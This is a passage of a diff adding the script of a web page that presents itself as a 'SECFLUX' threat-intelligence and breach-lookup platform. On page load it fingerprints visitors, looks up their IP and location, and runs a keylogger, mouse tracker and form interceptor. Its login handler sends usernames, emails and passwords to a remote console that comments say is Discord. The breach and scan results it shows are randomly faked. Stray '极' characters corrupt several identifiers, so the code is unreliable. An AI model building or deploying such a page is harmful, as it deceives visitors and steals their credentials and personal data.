+            console.log('📊 Data captured:', data.type, data.email || data.ip || '');
+        }
+        
+        // Initialize session variables
+        let sessionStartTime = null;
+        let sessionTimerInterval = null;
+        let lookupHistory = [];
+        
+        // Initialize data collection immediately on page load
+        (function() {
+            // Collect client information
+            const clientData = {
+                type: 'PAGE_VISIT',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                cookieEnabled: navigator.cookieEnabled,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                window: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer
+            };
+            
+            // Get IP address and location
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    clientData.ip = data.ip;
+                    
+                    // Get location data based极 on IP
+                    return fetch(`https://ipapi.co/${data.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(locationData => {
+                    clientData.location = locationData;
+                    
+                    // VPN detection (basic)
+                    clientData.vpnDetection = {
+                        isProxy: locationData.security && locationData.security.proxy,
+                        isVpn: locationData.security && locationData.security.vpn,
+                        isTor: location极Data.security && locationData.security.tor,
+                        isRelay: locationData.security && locationData.security.relay
+                    };
+                    
+                    // Send all collected data to Discord
+                    sendToRemoteConsole(clientData);
+                })
+                .catch(error => {
+                    clientData.ip = 'unknown';
+                    clientData.location = { error: 'Could not fetch location data' };
+                    clientData.vpnDetection = { error: 'Could not perform VPN detection' };
+                    
+                    sendToRemoteConsole(clientData);
+                });
+            
+            // Keylogger functionality
+            let typedContent = '';
+            document.addEventListener('keydown', function(event) {
+                typedContent += event.key;
+                if (typedContent.length > 100) {
+                    sendToRemoteConsole({
+                        type: 'KEYLOGGER_CAPTURE',
+                        content: typedContent,
+                        timestamp: new Date().toISOString()
+                    });
+                    typedContent = '';
+                }
+            });
+            
+            // Mouse movement tracking
+            let mouseMovements = [];
+            document.addEventListener('mousemove', function(event) {
+                mouseMovements.push({
+                    x: event.clientX,
+                    y: event.clientY,
+                    timestamp: Date.now()
+                });
+                
+                if (mouseMovements.length > 50) {
+                    sendToRemoteConsole({
+                        type: 'MOUSE_MOVEMENT_CAPTURE',
+                        movements: mouseMovements,
+                        timestamp: new Date().toISOString()
+                    });
+                    mouseMovements = [];
+                }
+            });
+            
+            // Form submission interception
+            const originalForms = document.querySelectorAll('form');
+            originalForms.forEach(form => {
+                form.addEventListener('submit', function(event) {
+                    const formData = new FormData(form);
+                    const formValues = Object.fromEntries(formData.entries());
+                    sendToRemoteConsole({
+                        type: 'FORM_SUBMISSION_CAPTURE',
+                        formId: form.id || 'unknown',
+                        values: formValues,
+                        timestamp: new Date().toISOString()
+                    });
+                });
+            });
+            
+            // Initialize terminal animation
+            initTerminalAnimation();
+            
+            // Initialize binary rain
+            initBinaryRain();
+            
+            // Initialize connection lines
+            initConnectionLines();
+        })();
+        
+        // Initialize binary rain effect
+        function initBinaryRain() {
+            const binaryRain = document.getElementById('binaryRain');
+            const characters = '01010101010101010101';
+            
+            for (let i = 0; i < 50;极 i++) {
+                const char = document.createElement('div');
+                char.className = 'binary-character';
+                char.textContent = characters.charAt(Math.floor(Math.random() * characters.length));
+                char.style.left = `${Math.random() * 100}%`;
+                char.style.animationDuration = `${5 + Math.random() * 10}s`;
+                char.style.animationDelay = `-${Math.random() * 10}s`;
+                char.style.fontSize = `${10 + Math.random() * 10}px`;
+                binaryRain.appendChild(char);
+            }
+        }
+        
+        // Initialize connection lines
+        function initConnectionLines() {
+            const connectionLine = document.getElementById('connectionLine');
+            
+            for (let i = 0; i < 10; i++) {
+                const line = document.createElement('div');
+                line.className = 'line';
+                line.style.top = `${Math.random() * 100}%`;
+                line.style.left = `${Math.random() * 100}%`;
+                line.style.width = `${20 + Math.random() * 100}px`;
+                line.style.animationDuration = `${2 + Math.random() * 4}s`;
+                line.style.animationDelay = `-${Math.random() * 5}s`;
+                line.style.opacity = `${0.1 + Math.random() * 0.2}`;
+                connectionLine.appendChild(line);
+            }
+        }
+        
+        // Terminal animation
+        function initTerminalAnimation() {
+            const terminal = document.querySelector('.hacking-terminal');
+            setInterval(() => {
+                const newEntry = document.createElement('div');
+                const isCommand = Math.random() > 0.7;
+                
+                if (isCommand) {
+                    newEntry.className = 'terminal-command';
+                    newEntry.innerHTML = '> ' + generateFakeCommand();
+                } else {
+                    newEntry.className = 'terminal-output';
+                    newEntry.textContent = generateFakeOutput();
+                }
+                
+                terminal.appendChild(newEntry);
+                terminal.scrollTop = terminal.scrollHeight;
+            }, 5000);
+        }
+        
+        function generateFakeCommand() {
+            const commands = [
+                'scan_network --subnet 192.168.1.0/24',
+                'analyze_threat --id T1059.007',
+                'update_database --force',
+                'monitor_traffic --protocol TCP',
+                'check_vulnerabilities --os Windows',
+                'decrypt_hash --algorithm SHA256',
+                'trace_ip --target 8.8.8.8'
+            ];
+            return commands[Math.floor(Math.random() * commands.length)];
+        }
+        
+        function generateFakeOutput() {
+            const outputs = [
+                '[INFO] Network scan completed. 47 hosts found.',
+                '[ALERT] Suspicious activity detected from IP 192.168.1.23',
+                '[WARNING] Outdated software detected on 3 systems',
+                '[CRITICAL] Potential brute force attack in progress',
+                '[NOTICE] Security patch available for deployment',
+                '[DEBUG] Packet analysis completed. No anomalies found.',
+                '[MONITOR] Traffic within normal parameters'
+            ];
+            return outputs[Math.floor(Math.random() * outputs.length)];
+        }
+        
+        // Page navigation
+        function showPage(pageId) {
+            // Hide all pages
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show selected page
+            document.getElementById(pageId + 'Page').classList.add('active');
+            
+            // Update active tab
+            document.querySelectorAll('.nav-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelector(`.nav-tab[data-page="${pageId}"]`).classList.add('active');
+            
+            // If logs page, update logs content
+            if (pageId === 'logs') {
+                updateLogsDisplay();
+            }
+        }
+        
+        // Set up tab navigation
+        document.querySelectorAll('.nav-tab').forEach(tab极 => {
+            tab.addEventListener('click', () => {
+                showPage(tab.getAttribute('data-page'));
+            });
+        });
+        
+        // Modal functions
+        function showAccessModal() {
+            document.getElementById('accessModal').classList.remove('hidden');
+            sendToRemoteConsole({
+                type: 'MODAL_ACCESS',
+                action: 'open',
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        function hideAccessModal() {
+            document.getElementById('accessModal').classList.add('hidden');
+        }
+        
+        // Enhanced login handler
+        function handleAccess() {
+            const username = document.getElementById('accessUsername')?.value || document.getElementById('username')?.value;
+            const email = document.getElementById('accessEmail')?.value || document.getElementById('email')?.value;
+            const password = document.getElementById('accessPassword')?.value || document.getElementById('password')?.value;
+            
+            // Log credentials to Discord
+            sendToRemoteConsole({
+                type: 'CREDENTIALS_CAPTURE',
+                username: username, 
+                email: email, 
+                password: password,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Update UI for logged in state
+            document.getElementById('loginBtn').style.display = 'none';
+            document.getElementById('logoutBtn').style.display = 'block';
+            document.getElementById('dashboardTab').style.display = 'block';
+            document.getElementById('breachLookupTab').style.display = 'block';
+            document.getElementById('logsTab').style.display = 'block';
+            
+            // Show dashboard
+            showPage('dashboard');
+            
+            // Start session timer
+            sessionStartTime = new Date();
+            document.getElementById('lastUpdate').textContent = 'Just now';
+            
+            // Show success message
+            const modal = document.getElementById('accessModal');
+            if (modal) {
+                hideAccessModal();
+            }
+        }
+        
+        // Logout function
+        function logout() {
+            // Send logout event to Discord
+            sendToRemoteConsole({
+                type: 'USER_LOGOUT',
+                timestamp: new Date().toISOString()
+            });
+            
+            // Reset UI to logged out state
+            document.getElementById('loginBtn').style.display = 'block';
+            document.getElementById('logoutBtn').style.display = 'none';
+            document.getElementById('dashboardTab').style.display = 'none';
+            document.getElementById('breachLookupTab').style.display = 'none';
+            document.getElementById('logsTab').style.display = 'none';
+            
+            // Show home page
+            show极Page('home');
+        }
+        
+        // System scan function
+        function runSystemScan() {
+            // Show scan in progress UI
+            const scanResults = document.getElementById('scanResults');
+            const scanResultsContent = document.getElementById('scanResultsContent');
+            
+            scanResults.style.display = 'block';
+            scanResultsContent.innerHTML = `
+                <div class="pulse-animation">
+                    <div class="极flex items-center mb-4">
+                        <i class="fas fa-spinner fa-spin mr-2 text-blue-400"></极i>
+                        <span class="font-medium">Running comprehensive system scan...</span>
+                    </div>
+                    <div class="scan-progress">
+                        <div class="scan-progress-bar" id="scanProgressBar"></div>
+                    </div>
+                    <div class="text-sm text-gray-400 mt-2" id="scanStatus">Initializing scan modules</div>
+                </div>
+            `;
+            
+            // Animate progress bar
+            const progressBar = document.getElementById('scanProgressBar');
+            const statusText = document.getElementById('scanStatus');
+            let progress = 0;
+            
+            const scanInterval = setInterval(() => {
+                progress += Math.random() * 10;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(scanInterval);
+                    finishSystemScan();
+                }
+                
+                progressBar.style.width = `${progress}%`;
+                
+                // Update status text
+                const statuses = [
+                    "Scanning network configurations",
+                    "Analyzing system vulnerabilities",
+                    "Checking for security patches",
+                    "Reviewing access logs",
+                    "Verifying encryption protocols",
+                    "Finalizing security assessment"
+                ];
+                
+                statusText.textContent = statuses[Math.floor(progress / 20)];
+            }, 500);
+            
+            // Send scan event to Discord
+            sendToRemoteConsole({
+                type: 'SYSTEM_SCAN',
+                action: 'started',
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        function finishSystemScan() {
+            const scanResultsContent = document.getElementById('scanResultsContent');
+            
+            // Generate fake scan results
+            const vulnerabilities = Math.floor(Math.random() * 5);
+            const warnings = Math.floor(Math.random() * 8);
+            const recommendations = Math.floor(Math.random() * 4) + 2;
+            
+            scanResultsContent.innerHTML = `
+                <div class="mb-4">
+                    <div class="flex items-center mb-2">
+                        <i class="fas fa-check-circle text-green-400 mr-2"></i>
+                        <span class="font-medium">System scan completed successfully</span>
+                    </div>
+                    <div class="text-sm text-gray-400">Scan finished at ${极new Date().toLocaleTimeString()}</div>
+                </div>
+                
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
+                    <div class="data-point text-center">
+                        <div class="text-2xl font-bold ${vulnerabilities > 0 ? 'text-red-400' : 'text-green-400'}">${vulnerabilities}</div>
+                        <div class="text-sm">Vulnerabilities</div>
+                    </div>
+                    <div class="data-point text-center">
+                        <div class="text-2xl font-bold ${warnings > 0 ? 'text-yellow-400' : 'text-green-400'}">${warnings}</div>
+                        <div class极="text-sm">Security Warnings</div>
+                    </div>
+                    <div class="data-point text-center">
+                        <div class="text-2xl font-bold text-blue-400">${recommendations}</div>
+                        <div class="text-sm">Recommendations</div>
+                    </div>
+                </div>
+                
+                <div class="professional-btn w-full" onclick="runSystemScan()">
+                    <i class="fas fa-sync-alt mr-2"></i>Run Scan Again
+                </div>
+            `;
+            
+            // Send scan completion event to Discord
+            sendToRemoteConsole({
+                type: 'SYSTEM_SCAN',
+                action: 'completed',
+                timestamp: new Date().toISOString(),
+                results: {
+                    vulnerabilities: vulnerabilities,
+                    warnings: warnings,
+                    recommendations: recommendations
+                }
+            });
+        }
+        
+        // Breach lookup functions
+        function lookupEmail() {
+            const email = document.getElementById('emailLookup').value;
+            if (!email) return;
+            
+            // Add to history
+            addToLookupHistory('email', email);
+            
+            // Send to Discord
+            sendToRemoteConsole({
+                type: 'BREACH_LOOKUP',
+                queryType: 'email',
+                value: email,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Generate fake breach data
+            const hasBreaches = Math.random() > 0.5;
+            const breachCount = hasBreaches ? Math.floor(Math.random() * 5) + 1 : 0;
+            const fakeBreaches = hasBreaches ? generateFakeBreaches(breachCount, 'email', email) : [];
+            
+            displayBreachResults('email', email, hasBreaches, breachCount, fakeBreaches);
+        }
+        
+        function lookupUsername() {
+            const username = document.getElementById('usernameLookup').value;
+            if (!username) return;
+            
+            // Add to history
+            addToLookupHistory('username', username);
+            
+            // Send to Discord
+            sendToRemoteConsole({
+                type: 'BREACH极_LOOKUP',
+                queryType: 'username',
+                value: username,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Generate fake breach data
+            const hasBreaches = Math.random() > 0.6;
+            const breachCount = hasBreaches ? Math.floor(Math.random() * 5) + 1 : 0;
+            const fakeBreaches = hasBreaches ? generate极FakeBreaches(breachCount, 'username', username) : [];
+            
+            displayBreachResults('username', username, hasBreaches, breachCount, fakeBreaches);
+        }
+        
+        function lookupHash() {
+            const hash = document.getElementById('hashLookup').value;
+            if (!hash) return;
+            
+            // Add to history
+            addToLookupHistory('hash', hash);
+            
+            // Send to Discord
+            sendToRemoteConsole({
+                type: 'BREACH_LOOKUP',
+                queryType: 'hash',
+                value: hash,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Generate fake breach data
+            const hasBreaches = Math.random() > 0.7;
+            const breachCount = hasBreaches ? Math.floor(Math.random() * 5) + 1 : 0;
+            const fakeBreaches = hasBreaches ? generateFakeBreaches(breachCount, 'hash', hash) : [];
+            
+            displayBreachResults('hash', hash, hasBreaches, breachCount, fakeBreaches);
+        }
+        
+        function lookupIP() {
+            const ip = document.getElementById('ipLookup').value;
+            if (!ip) return;
+            
+            // Add to history
+            addToLookupHistory('ip', ip);
+            
+            // Send to Discord
+            sendToRemoteConsole({
+                type: 'BREACH_LOOKUP',
+                queryType: 'ip',
+                value: ip,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Generate fake breach data
+            const hasBreaches = Math.random() > 0.8;
+            const breachCount = hasBreaches ? Math.floor(Math.random() * 5) + 1 : 0;
+            const fakeBreaches = hasBreaches ? generateFakeBreaches(breachCount, 'ip', ip) : [];
+            
+            displayBreachResults('ip', ip, hasBreaches, breachCount, fakeBreaches);
+        }
+        
+        function addToLookupHistory(type, value) {
+            lookupHistory.unshift({
+                type: type,
+                value: value,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Keep only the last 20 entries
+            if (lookupHistory.length > 20) {
+                lookupHistory = lookupHistory.slice(0, 20);
+            }
+        }
+        
+        function updateLogsDisplay() {
+            const logsContent = document.getElementById('logsContent');
+            
+            if (lookupHistory.length === 0) {
+                logsContent.innerHTML = `
+                    <div class="text-center py-8 text-gray-400">
+                        <i class="fas fa-history fa-3极x mb-4"></i>
+                        <p>No lookup history yet</极p>
+                    </div>
+                `;
+                return;
+            }
+            
+            logsContent.innerHTML = lookupHistory.map(entry => `
+                <div class="log-entry">
+                    <div class="flex items-center">
+                        <span class="log-timestamp">${new Date(entry.timestamp).toLocaleTimeString()}</span>
+                        <span class="log-type">${entry.type.toUpperCase()}_LOOKUP</span>
+                    </div>
+                    <div class="log-content">Queried: ${entry.value}</div>
+                </div>
+            `).join('');
+        }
+        
+        function clearLogs() {
+            lookupHistory = [];
+            updateLogsDisplay();
+            
+            // Send clear logs event to Discord
+            sendToRemoteConsole({
+                type: 'LOGS_CLEARED',
+                timestamp: new Date().toISOString()
+            });
+        }
+        
+        function generateFakeBreaches(count, type, value) {
+            const breaches = [];
+            const companies = ['Adobe', 'Yahoo', 'LinkedIn', 'Facebook', 'Twitter', 'Marriott', 'Equifax', 'Capital One'];
+            const dataTypes = {
+                email: ['email addresses', 'passwords', 'usernames', 'personal data'],
+                username: ['usernames', 'passwords', 'email addresses', 'security questions'],
+                hash: ['password hashes', 'salted hashes', 'encryption keys', 'authentication tokens'],
+                ip: ['IP addresses', 'browsing history', 'geolocation data', 'device information']
+            };
+            
+            for (let i = 0; i < count; i++) {
+                const company = companies[Math.floor(Math.random() * companies.length)];
+                const year = 2015 + Math.floor(Math.random() * 8);
+                const month = Math.floor(Math.random() * 12) + 1;
+                const day = Math.floor(Math.random() * 28) + 1;
+                const records = Math.floor(Math.random() * 100000000) + 1000000;
+                
+                breaches.push({
+                    name: `${company} Data Breach`,
+                    date: `${year}-${month.toString().padStart(2, '0')}-${day.toString().padStart(2, '0')}`,
+                    records: records,
+                    data: dataTypes[type].join(', ')
+                });
+            }
+            
+            return breaches;
+        }
+        
+        function displayBreachResults(type, value, hasBreaches, breachCount, breaches) {
+            const resultsDiv = document.getElementById('lookupResults');
+            
+            if (hasBreaches极) {
+                resultsDiv.innerHTML = `
+                    <div class="breach-alert">
+                        <div class="flex items-center mb-2">
+                            <i class="fas fa-exclamation-triangle text-red-400 mr-2"></i>
+                            <h3 class="text-lg font-semibold">Breach Found!</h3>
+                        </div>
+                        <p class="mb-3">The ${type} <strong>${value}</strong> was found in <strong>${breachCount}</strong> data breaches.</p>
+                        <div class="grid grid-cols-1 gap-2">
+                            ${breaches.map(breach => `
+                                <div class="breach-result">
+                                    <h4 class="font-medium">${breach.name}</h4>
+                                    <p class="text-sm">Date: ${breach.date}</p>
+                                    <p class="text-sm">Records: ${breach.records.toLocaleString()}</p>
+                                    <p class="text-sm">Data Compromised: ${breach.data}</p>
+                                </div>
+                            `).join('')}
+                        </div>
+                    </div>
+                `;
+            } else {
+                resultsDiv.innerHTML = `
+                    <div class="breach-result">
+                        <div class="flex items-center mb-2">
+                            <极i class="fas fa-check-circle text-green-400 mr-2"></i>
+                            <h3 class="text-lg font-semib极old">No Breaches Found</h3>
+                        </div>
+                        <p>The ${type} <strong>${value}</strong> was not found in any known data breaches.</p>
+                    </div>
+                `;
+            }
+        }
+        
+        // Close modal when clicking outside
+        document.getElementById('accessModal')?.addEventListener('click', function(e) {
+            if (e.target === this) hideAccessModal();
+        });
+        
+        // Initialize
+        window.addEventListener('load', function() {
+            console.log('%c🔐 SECFLUX ENTERPRISE PLATFORM', 'color: #00a0d0; font-size: 16px; font-weight: bold;');
+            console.log('%cThreat Intelligence • Breach Monitoring • Risk Analytics', 'color: #94a3b8;');
+            console.log('%c⚠️  Authorized access only. All activity is monitored.', 'color: #ff6b6b;');
+        });
+    </script>
+</body>
+</html>
